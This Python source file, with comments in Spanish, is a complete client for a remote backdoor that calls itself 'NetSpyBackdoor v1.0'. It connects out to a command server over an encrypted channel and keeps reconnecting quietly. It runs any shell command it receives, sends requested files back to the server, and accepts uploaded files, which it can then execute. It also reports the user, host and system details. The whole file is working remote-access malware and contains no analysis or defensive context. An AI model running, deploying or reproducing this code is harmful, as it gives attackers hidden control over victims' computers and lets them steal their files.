import socket
import os
import struct
import time
import subprocess
import hashlib
import platform
import getpass
import json
import random

from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ----------------------------------------------------------------
# Configuración
# ----------------------------------------------------------------
SERVER_HOST = 'localhost'
SERVER_PORT = 4444

# ----------------------------------------------------------------
# Configuración de reconexión (exponencial con jitter)
# ----------------------------------------------------------------
RECONNECT_INITIAL_INTERVAL = 5     # segundos de espera inicial
RECONNECT_MAX_INTERVAL     = 300   # máximo tiempo de espera entre reintentos

# ----------------------------------------------------------------
# AES-GCM utils
# ----------------------------------------------------------------
def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def send_encrypted_message(sock, plaintext: str, aes_key: bytes):
    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, plaintext.encode('utf-8'), None)
    msg = nonce + ct
    sock.sendall(struct.pack('!I', len(msg)) + msg)

def receive_encrypted_message(sock, aes_key: bytes) -> str:
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    length = struct.unpack('!I', raw_len)[0]
    data = recvall(sock, length)
    if not data:
        return None
    nonce, ct = data[:12], data[12:]
    aesgcm = AESGCM(aes_key)
    return aesgcm.decrypt(nonce, ct, None).decode('utf-8')

# ----------------------------------------------------------------
# Banner y ayuda
# ----------------------------------------------------------------
def banner() -> str:
    usr = getpass.getuser()
    so = platform.system()
    version = platform.release()
    host = platform.node()
    machin = platform.machine()
    arct = platform.architecture()
    pythonv = platform.python_version()

    info_usr = f"{usr}@{host}"
    info_so = f"{so} {version}"
    machinc = f"{machin} {arct}"

    lines = [
        "              ,---------------------------,",
        "              |  /---------------------\\  |",
        f"              | | {info_usr:<22.22}| |",
        f"              | | {info_so:<22.22}| |",
        f"              | | {machinc:<22.22}| |",
        "              | |                       | |",
        "              | |                       | |",
        "              |  \\_____________________/  |",
        "              |___________________________|",
        "            ,---\\_____     []     _______/------,",
        "          /         /______________\\           /|",
        "        /___________________________________ /  |",
        "        | NetSpyBackdoor v1.0|(AES-GCM)|TLS |    )",
        "        |  _ _ _    CLient-NetSpy [ v1.0 ]  |   |",
       f"        |  o o o           Python [{pythonv:<5}]  |  /",
        "        |__________________________________ |/",
        "    /-------------------------------------/|",
        "  /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /",
        "/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /",
        "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
    ]
    return "\n".join(lines)

HELP_TEXT = (
    "HELP             - Muestra este mensaje.\n"
    "GET_CWD          - Directorio actual.\n"
    "GET_FILE <file>  - Envía archivo al servidor.\n"
    "PUT_FILE <file>  - Recibe archivo del servidor.\n"
    "NETINFO          - Muestra info de red.\n"
    "Otros comandos se ejecutan en shell."
)

# ----------------------------------------------------------------
# Ejecución de comandos y transferencia
# ----------------------------------------------------------------
def execute_command(cmd: str) -> str:
    if cmd.startswith('cd '):
        try:
            os.chdir(cmd[3:].strip())
            return f"[+] Directorio: {os.getcwd()}"
        except Exception as e:
            return f"[-] {e}"
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return (res.stdout or res.stderr).strip() or '[+] Ejecutado.'

def send_file(sock, aes_key, fname):
    try:
        if not os.path.isfile(fname):
            send_encrypted_message(sock, '[-] No encontrado.', aes_key)
            return
        size = os.path.getsize(fname)
        h = hashlib.sha256()
        with open(fname, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b''):
                h.update(chunk)
        header = f"SIZE {size} {h.hexdigest()}"
        send_encrypted_message(sock, header, aes_key)
        
        # Enviar archivo en chunks cifrados
        with open(fname, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b''):
                aesgcm = AESGCM(aes_key)
                nonce = os.urandom(12)
                ct = aesgcm.encrypt(nonce, chunk, None)
                packet = nonce + ct
                sock.sendall(struct.pack('!I', len(packet)))
                sock.sendall(packet)
    except Exception as e:
        send_encrypted_message(sock, f'[-] Error: {e}', aes_key)

def receive_file(sock, aes_key, fname):
    try:
        hdr = receive_encrypted_message(sock, aes_key)
        if not hdr or not hdr.startswith('SIZE '):
            send_encrypted_message(sock, '[-] Encabezado inválido.', aes_key)
            return '[-] Encabezado inválido.'
        
        _, sz, expected = hdr.split()
        file_size = int(sz)
        
        received = 0
        h = hashlib.sha256()
        with open(fname, 'wb') as f:
            while received < file_size:
                raw_len = recvall(sock, 4)
                if not raw_len:
                    send_encrypted_message(sock, '[-] Error recibiendo archivo.', aes_key)
                    return '[-] Error recibiendo archivo.'
                packet_len = struct.unpack('!I', raw_len)[0]
                packet = recvall(sock, packet_len)
                if not packet:
                    send_encrypted_message(sock, '[-] Error recibiendo chunk.', aes_key)
                    return '[-] Error recibiendo chunk.'
                
                nonce = packet[:12]
                ct = packet[12:]
                aesgcm = AESGCM(aes_key)
                chunk = aesgcm.decrypt(nonce, ct, None)
                f.write(chunk)
                h.update(chunk)
                received += len(chunk)
        
        if h.hexdigest() != expected:
            send_encrypted_message(sock, '[-] Hash mismatch.', aes_key)
            return '[-] Hash mismatch.'
        
        send_encrypted_message(sock, f"[+] Guardado {fname}", aes_key)
        return f"[+] {fname} recibido."
    except Exception as e:
        send_encrypted_message(sock, f'[-] Error: {e}', aes_key)
        return f'[-] Error: {e}'

# ----------------------------------------------------------------
# Info de red
# ----------------------------------------------------------------
def get_network_info():
    out = ''
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        out += f"IP local: {s.getsockname()[0]}\n"
        s.close()
    except:
        out += 'Error obteniendo IP.'
    return out

# ----------------------------------------------------------------
# Conexión principal al servidor con backoff exponencial
# ----------------------------------------------------------------
def connect_to_server():
    backoff = RECONNECT_INITIAL_INTERVAL

    while True:
        try:
            # Crear socket TCP simple
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_HOST, SERVER_PORT))

            # Conexión exitosa: reinicia backoff
            backoff = RECONNECT_INITIAL_INTERVAL

            # Paso 1: esperar mensaje de bienvenida del servidor
            welcome_msg = client_socket.recv(1024).decode('utf-8').strip()
            if 'NetSpy Server' not in welcome_msg:
                client_socket.close()
                continue

            # Paso 2: enviar mensaje de identificación del cliente
            client_socket.sendall(b'NetSpyBackdoor v1.0|(AES-GCM)|TLS')

            # Paso 3: recibir clave pública del servidor
            data = client_socket.recv(4096)
            if not data.startswith(b'PUBKEY:'):
                client_socket.close()
                continue

            server_pub = serialization.load_pem_public_key(data[len(b'PUBKEY:'):])

            # Genera AES key y la envía cifrada
            aes_key = os.urandom(32)
            enc = server_pub.encrypt(
                aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            client_socket.sendall(struct.pack('!I', len(enc)) + enc)

            # Loop principal de comandos
            while True:
                msg = receive_encrypted_message(client_socket, aes_key)
                if not msg:
                    break
                
                parts = msg.strip().split(maxsplit=1)
                if not parts:
                    continue
                    
                cmd = parts[0].upper()

                try:
                    if cmd == 'HELP':
                        send_encrypted_message(client_socket, HELP_TEXT, aes_key)
                    elif cmd == 'GET_CWD':
                        send_encrypted_message(client_socket, os.getcwd(), aes_key)
                    elif cmd == 'GET_FILE':
                        if len(parts) == 2:
                            send_file(client_socket, aes_key, parts[1])
                        else:
                            send_encrypted_message(client_socket, '[-] Uso: GET_FILE <archivo>', aes_key)
                    elif cmd == 'PUT_FILE':
                        # Parsear comando PUT_FILE
                        if len(parts) < 2:
                            send_encrypted_message(client_socket, '[-] Uso: PUT_FILE <archivo>', aes_key)
                            continue
                        
                        # Separar nombre de archivo y flags
                        args = parts[1].split()
                        fname = args[0] if args else None
                        execute_after = '-exc' in args
                        
                        if fname:
                            receive_file(client_socket, aes_key, fname)
                            # Si tiene flag -exc, ejecutar el archivo
                            if execute_after:
                                try:
                                    if platform.system() == 'Windows':
                                        os.startfile(fname)
                                    else:
                                        subprocess.Popen(['./' + fname], shell=False)
                                    send_encrypted_message(client_socket, f'[+] Ejecutando {fname}', aes_key)
                                except Exception as e:
                                    send_encrypted_message(client_socket, f'[-] Error ejecutando: {e}', aes_key)
                    elif cmd == 'BANNER':
                        send_encrypted_message(client_socket, banner(), aes_key)
                    elif cmd == 'NETINFO':
                        send_encrypted_message(client_socket, get_network_info(), aes_key)
                    else:
                        # Ejecutar como comando shell
                        res = execute_command(msg)
                        send_encrypted_message(client_socket, res, aes_key)
                except Exception as e:
                    send_encrypted_message(client_socket, f'[-] Error procesando comando: {e}', aes_key)

        except Exception as e:
            pass
        finally:
            try:
                client_socket.close()
            except:
                pass

        # Espera antes de reintentar (backoff exponencial + jitter)
        wait_time = backoff + random.uniform(0, backoff * 0.1)
        time.sleep(wait_time)
        backoff = min(backoff * 2, RECONNECT_MAX_INTERVAL)

if __name__ == '__main__':
    connect_to_server()